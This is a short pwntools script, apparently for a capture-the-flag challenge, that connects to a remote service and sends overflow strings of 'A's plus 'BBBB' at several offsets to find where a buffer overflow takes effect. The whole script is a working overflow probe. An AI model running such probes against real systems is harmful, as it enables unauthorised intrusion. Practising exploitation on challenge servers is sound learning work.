from pwn import *

context.log_level = 'info'

HOST = '0.cloud.chals.io'
PORT = 19476

for offset in [64, 68, 72, 76, 80, 96, 100, 128, 256]:
    try:
        r = remote(HOST, PORT, timeout=5)
        r.recvuntil(b'closed.')
        payload = b'A' * offset + b'B' * 4
        r.sendline(payload)
        resp = r.recvall(timeout=3)
        r.close()
        status = "SUCCESS" if b"SUCCESS" in resp else "FAIL"
        print(f'offset={offset:3d}: {status} — {resp.decode().strip()}')
    except Exception as e:
        print(f'offset={offset:3d}: error - {e}')
